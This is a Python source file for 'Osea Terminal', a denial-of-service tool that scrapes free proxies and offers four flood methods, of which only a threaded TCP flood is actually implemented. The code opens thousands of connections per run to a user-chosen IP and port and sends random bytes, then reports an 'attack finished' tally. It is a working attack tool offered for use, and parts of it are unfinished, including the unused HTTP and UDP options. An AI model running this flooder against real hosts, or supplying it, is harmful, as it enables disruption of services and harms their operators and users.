import aiohttp
import asyncio
import threading
import socket
import random
import time
import requests
from colorama import Fore, Style, init
from aiohttp_socks import ProxyConnector

init(autoreset=True)

class OseaTerminal:
    def __init__(self):
        self.running = False
        self.sent = self.success = self.failed = 0
        self.user_agents = self.load_user_agents()
        self.proxies = self.fetch_proxies()
        self.l4_threads = []
        self.l7_tasks = []

    def load_user_agents(self):
        return [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/91.0",
            "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 Chrome/87.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Firefox/89.0",
            "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36"
        ]

    def fetch_proxies(self):
        print(Fore.YELLOW + "Fetching fresh proxy list..." + Style.RESET_ALL)
        try:
            url = "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=3000&country=all"
            response = requests.get(url)
            proxies = [line.strip() for line in response.text.splitlines() if line.strip()]
            print(Fore.GREEN + f"Loaded {len(proxies)} proxies." + Style.RESET_ALL)
            return proxies
        except:
            print(Fore.RED + "Failed to fetch proxies. Continuing without them." + Style.RESET_ALL)
            return []

    def display_menu(self):
        print(Fore.RED + """
+----------------------------------+
|           OSEA TERMINAL          |
|          Made by Necuix          |
+----------------------------------+
        Methods:
         1. Storm Surge (HTTP/1.1)
         2. Thunderstrike (HTTPS/1.1)
         3. Blastwave (UDP Flood)
         4. Firestorm (TCP Flood)
+----------------------------------+
        """ + Style.RESET_ALL)

    def firestorm_tcp_flood(self, target, port, duration):
        self.running = True
        self.sent = self.failed = 0
        timeout = time.time() + duration

        def flood():
            while time.time() < timeout and self.running:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(1)
                    s.connect((target, port))
                    s.send(random._urandom(1024))
                    s.close()
                    self.sent += 1
                except:
                    self.failed += 1

        self.l4_threads = [threading.Thread(target=flood, daemon=True) for _ in range(4000)]
        for t in self.l4_threads: t.start()
        for t in self.l4_threads: t.join()

    def start(self):
        self.display_menu()
        method = input(Fore.RED + "Select Method (1-4): " + Style.RESET_ALL).strip()
        target = input("Target IP: ").strip()
        port = int(input("Port: ").strip())
        duration = int(input("Duration in seconds (max 240): ").strip())
        if duration > 240:
            print(Fore.RED + "Duration cannot exceed 240 seconds. Setting to 240." + Style.RESET_ALL)
            duration = 240

        print(Fore.RED + f"\n[!] Starting {['Storm Surge','Thunderstrike','Blastwave','Firestorm'][int(method)-1]} on {target}:{port} for {duration}s\n")

        if method == "4":
            self.firestorm_tcp_flood(target, port, duration)

        print(Fore.RED + f"\n[✓] Attack finished. Packets sent: {self.sent}, Failed: {self.failed}\n")
        self.running = False


if __name__ == '__main__':
    OseaTerminal().start()
